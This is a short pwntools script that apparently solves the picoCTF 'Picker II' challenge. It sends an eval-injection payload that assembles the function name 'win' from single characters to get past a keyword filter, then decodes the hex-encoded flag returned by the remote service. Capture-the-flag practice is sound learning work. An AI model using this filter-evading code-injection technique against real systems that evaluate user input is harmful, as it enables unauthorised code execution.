from pwn import *

# r = process(["python3", "picker-II.py"])
HOST, PORT = "saturn.picoctf.net 55570".split()
r = remote(HOST, PORT)
payload = b"eval(''.join(['w', 'i', 'n']))"
r.sendline(payload)
flag = r.recvline().decode().split()[1:]
for val in flag:
    print(bytes.fromhex(val[2:]).decode(), end="")
r.interactive()
